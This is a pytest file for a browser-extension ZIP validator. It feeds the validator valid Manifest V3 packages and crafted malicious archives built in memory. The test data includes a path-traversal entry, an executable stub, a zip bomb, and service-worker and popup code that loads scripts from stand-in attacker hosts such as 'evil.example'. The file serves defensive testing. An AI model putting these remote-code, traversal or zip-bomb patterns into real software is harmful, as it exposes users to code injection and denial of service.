"""Validation engine tests, including the security cases from §35.

ZIPs are built in-memory so malicious archives (path traversal, zip bomb, exe,
remote code) can be exercised safely and deterministically.
"""
from __future__ import annotations

import io
import json
import zipfile

from extsync_worker.validation import Limits, Severity, validate_extension_zip


def _zip(files: dict[str, bytes | str], *, extra_entries=None) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, content in files.items():
            data = content.encode("utf-8") if isinstance(content, str) else content
            zf.writestr(name, data)
        for entry in extra_entries or []:
            zf.writestr(entry[0], entry[1])
    return buf.getvalue()


def _manifest(**overrides) -> str:
    base = {
        "manifest_version": 3,
        "name": "Test Extension",
        "version": "1.0.0",
        "description": "A test extension",
        "action": {"default_title": "Test"},
        "icons": {"16": "icon16.png"},
    }
    base.update(overrides)
    return json.dumps(base)


def _codes(result) -> set[str]:
    return {f.code for f in result.findings}


def test_valid_simple_extension():
    data = _zip({"manifest.json": _manifest(), "icon16.png": b"\x89PNG\r\n"})
    res = validate_extension_zip(data)
    assert res.ok, [f.to_dict() for f in res.errors]
    assert res.manifest.name == "Test Extension"
    assert res.manifest.manifest_version == 3
    assert res.file_count == 2
    assert len(res.sha256) == 64


def test_classic_service_worker():
    data = _zip({
        "manifest.json": _manifest(background={"service_worker": "sw.js"}),
        "sw.js": "console.log('sw')",
        "icon16.png": b"x",
    })
    res = validate_extension_zip(data)
    assert res.ok
    assert res.manifest.service_worker == "sw.js"
    assert res.manifest.service_worker_type == "classic"


def test_module_service_worker():
    data = _zip({
        "manifest.json": _manifest(background={"service_worker": "sw.js", "type": "module"}),
        "sw.js": "export const x = 1;",
        "icon16.png": b"x",
    })
    res = validate_extension_zip(data)
    assert res.ok
    assert res.manifest.service_worker_type == "module"


def test_content_scripts_present_and_missing():
    ok = _zip({
        "manifest.json": _manifest(content_scripts=[{"matches": ["https://example.com/*"], "js": ["cs.js"]}]),
        "cs.js": "console.log(1)",
        "icon16.png": b"x",
    })
    res = validate_extension_zip(ok)
    assert res.ok
    assert "https://example.com/*" in res.permissions.content_scripts_matches

    missing = _zip({
        "manifest.json": _manifest(content_scripts=[{"matches": ["https://x/*"], "js": ["nope.js"]}]),
        "icon16.png": b"x",
    })
    res2 = validate_extension_zip(missing)
    assert not res2.ok
    assert "CONTENT_SCRIPT_MISSING" in _codes(res2)


def test_permissions_extracted():
    data = _zip({
        "manifest.json": _manifest(
            permissions=["storage", "tabs", "nativeMessaging"],
            host_permissions=["<all_urls>"],
        ),
        "icon16.png": b"x",
    })
    res = validate_extension_zip(data)
    assert set(res.permissions.permissions) == {"storage", "tabs", "nativeMessaging"}
    assert res.permissions.host_permissions == ["<all_urls>"]
    assert res.permissions.uses_native_messaging is True
    assert res.risk_score > 0  # sensitive perms raise the score


def test_broken_manifest():
    data = _zip({"manifest.json": "{not valid json", "icon16.png": b"x"})
    res = validate_extension_zip(data)
    assert not res.ok
    assert "INVALID_MANIFEST" in _codes(res)


def test_missing_manifest():
    data = _zip({"icon16.png": b"x"})
    res = validate_extension_zip(data)
    assert not res.ok
    assert "INVALID_MANIFEST" in _codes(res)


def test_manifest_v2_rejected():
    data = _zip({"manifest.json": _manifest(manifest_version=2), "icon16.png": b"x"})
    res = validate_extension_zip(data)
    assert not res.ok
    assert "MANIFEST_VERSION" in _codes(res)


def test_path_traversal_blocked():
    data = _zip(
        {"manifest.json": _manifest(), "icon16.png": b"x"},
        extra_entries=[("../evil.js", "stealEverything()")],
    )
    res = validate_extension_zip(data)
    assert "PATH_TRAVERSAL" in _codes(res)
    assert not res.ok


def test_disallowed_binary_blocked():
    data = _zip({"manifest.json": _manifest(), "icon16.png": b"x", "malware.exe": b"MZ\x90\x00"})
    res = validate_extension_zip(data)
    assert "DISALLOWED_BINARY" in _codes(res)
    assert not res.ok


def test_remote_code_blocked():
    data = _zip({
        "manifest.json": _manifest(background={"service_worker": "sw.js"}),
        "sw.js": "importScripts('https://evil.example/payload.js')",
        "icon16.png": b"x",
    })
    res = validate_extension_zip(data)
    assert "REMOTE_CODE" in _codes(res)
    assert not res.ok


def test_remote_script_tag_in_html_blocked():
    data = _zip({
        "manifest.json": _manifest(),
        "popup.html": '<html><script src="https://cdn.evil/x.js"></script></html>',
        "icon16.png": b"x",
    })
    res = validate_extension_zip(data)
    assert "REMOTE_CODE" in _codes(res)


def test_eval_warns_but_not_fatal():
    data = _zip({
        "manifest.json": _manifest(background={"service_worker": "sw.js"}),
        "sw.js": "const r = eval('1+1')",
        "icon16.png": b"x",
    })
    res = validate_extension_zip(data)
    assert "EVAL_USAGE" in _codes(res)
    assert res.ok  # warning only
    assert any(f.severity == Severity.warning for f in res.findings)


def test_zip_bomb_total_size_blocked():
    # Many highly-compressible large entries exceed the extracted-size limit.
    big = b"\x00" * (5 * 1024 * 1024)
    files = {"manifest.json": _manifest(), "icon16.png": b"x"}
    extra = [(f"pad{i}.txt", big) for i in range(60)]  # ~300MB uncompressed
    data = _zip(files, extra_entries=extra)
    res = validate_extension_zip(data, Limits(max_extracted_bytes=200 * 1024 * 1024))
    assert "ZIP_BOMB" in _codes(res)
    assert not res.ok


def test_too_many_files_blocked():
    files = {"manifest.json": _manifest(), "icon16.png": b"x"}
    extra = [(f"f{i}.js", "x") for i in range(50)]
    data = _zip(files, extra_entries=extra)
    res = validate_extension_zip(data, Limits(max_file_count=10))
    assert "TOO_MANY_FILES" in _codes(res)


def test_bridge_detection():
    with_bridge = _zip({
        "manifest.json": _manifest(background={"service_worker": "sw.js"}),
        "sw.js": "console.log(1)",
        "extsync-bridge.js": "// bridge",
        "icon16.png": b"x",
    })
    assert validate_extension_zip(with_bridge).has_bridge is True

    without = _zip({"manifest.json": _manifest(), "icon16.png": b"x"})
    assert validate_extension_zip(without).has_bridge is False


def test_bad_zip():
    res = validate_extension_zip(b"this is not a zip file at all")
    assert "INVALID_ARCHIVE" in _codes(res)
    assert not res.ok
